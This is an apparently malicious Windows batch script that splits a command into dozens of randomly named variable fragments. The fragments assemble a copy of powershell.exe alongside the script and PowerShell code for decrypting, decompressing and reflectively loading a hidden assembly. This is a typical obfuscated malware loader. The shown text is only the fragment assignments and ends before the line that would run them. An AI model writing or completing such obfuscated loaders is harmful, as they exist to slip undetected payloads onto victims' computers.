@echo off
set "sKNvZjwyAg=py"
set "CBljKJjQvN=in"
set "GRNACrSdKV=ws"
set "KeaoMVTPtQ=ll"
set "BwjOwxEwzg=1."
set "pXAIGohQho=Po"
set "FJKXTLNLGs=rS"
set "jrkFnjQouC=ow"
set "FKmHtIYGeB=ll"
set "PtaRXMAsLf=32"
set "XXdOUQlRFl=nd"
set "fjUyaxNFLl=:\"
set "GwEVFuHeXI=.e"
set "YrXvuSViCp=do"
set "ggLHHfguJS= C"
set "hvyViBmwmI=y "
set "lVaAbhjzFG=st"
set "hClKKGkJTk= /"
set "RXrQOoRUkS=po"
set "XRrRdDfsah=he"
set "mowwUWWIQb=xe"
set "WyAJOBIwlX=0\"
set "nxRRUiffEk=Sy"
set "dDoavgkOhi=em"
set "rwqnTfcDxO=rs"
set "wRNpHMaRQN=s\"
set "eLKkqARmnz=\W"
set "NnAUEnUmRp=we"
set "CKXYhMNpPy=we"
set "zufTQTSJDS=Wi"
set "WWymqpMUxs=co"
set "ECnlpGnCPV=\v"
set "RffAyaQpPg=he"
set "bNoJktYkbq= %~dp0"
set "THZmXqeSGP=cd"
set "OBIQkwbdLd=ddin"
set "vDKifnZzbr=esFX"
set "VgYpykplWv=rity"
set "ImsPPvmhHE=gth)"
set "NyorlnIRFO=gAot"
set "kuHQteKcfY=ct S"
set "mwpxmjEXmK= [Sy"
set "LyItCKtBOW=voBb"
set "alSDNbvhoG=ress"
set "qrDziGiklt=('l0"
set "mConjAKaox=)($B"
set "dstaybeMTE=ment"
set "tRJVYQSRIW=$voB"
set "vsjpZElnef=+hAO"
set "mmWVGhbBev=pher"
set "yLimBkSRLB=Stre"
set "IOFkqQbbSd=;$uv"
set "JGdofIWopw=m(, "
set "RBtjjUsfRz=comp"
set "kftyEdiSoB=[]] "
set "MnNYzHyAbe=-4] "
set "bdxRGAiDRy=urit"
set "MOJPkbyQoo=pStr"
set "jLBgLGlTon=onve"
set "JvrMHhaPnw=vJXQ"
set "wenYLjoOhM='[-1"
set "RQbwyDioeo=oBbr"
set "KLZwuXgBmb=form"
set "XYvpgansFJ=rofi"
set "VxagWYJFpi=('da"
set "TttdbNAbmT=]::N"
set "sUkdpaxUKG=$vJX"
set "KmtEGqiCeY=gMod"
set "mpYhLqXGTR=cB.T"
set "BGDXAPMvVY=GTpx"
set "mOtuJMaraJ=flec"
set "XpKhREMsxN=3HWs"
set "guzTjDqDwT=Syst"
set "TUpwFwkEcg=d;$v"
set "mKCTUYOMEL=pres"
set "GmIEvzyLlZ=)))"
set "zNMcleglgr=Comp"
set "sjOtoOBfcg=V = "
set "CZpEnRwwyt=.Key"
set "YyMMMYqQkv=daeR"
set "hsYnOFBjTj=;$Ll"
set "kUsEEqjzHT=Fina"
set "ADWuCdGXCK=($gA"
set "eZfehpnVDc=tem."
set "xYckKVjCrd=tem."
set "jgNbzGztxk=ck($"
set "xtMJquXXfP=$ulR"
set "DEIrJgcIyo=.Dis"
set "iIepnNfPhA=; };"
set "DBsOsbMLng=$voB"
set "jjcOLTTImH=t Sy"
set "lLzjyNoRVk=stem"
set "iTBbDjhbqV=);$v"
set "wHnKHfEQyc=k; }"
set "eHHKJUTpYO=  $B"
set "qzpizsdJlY=::('"
set "vxHYVioCCe=lRcB"
set "AEyevxlZjQ=$ulR"
set "StDYtAryRg=-1.."
set "xLXKSCukJt= '')"
set "QKpvdIFGUJ=.Sec"
set "ANYRvnzrHE=Ql.I"
set "yZRykRXavx=JXQl"
set "btSQMBLvGO=.Cop"
set "KDBuVAPrHg=isfL"
set "kNsghBzzjk=$LlX"
set "aoesRreQtt=sGUc"
set "ohoSsdDQbR=[-1."
set "JlsDssbmKa=ew-O"
set "NSHQpokGYa=ose("
set "zsZdmVSjhK=y.Cr"
set "sxdjfyhQWm=1..-"
set "fLuCZGGvOq=pose"
set "ftlwxWkntu=);$u"
set "qLOMYtskAG=Bmor"
set "TlstkaOmhE=ach "
set "XrYIwtWcgp=r = "
set "MEYtQHryCU=::De"
set "BkgfidLhTU=c) {"
set "xFKoYTZOSh=AX, "
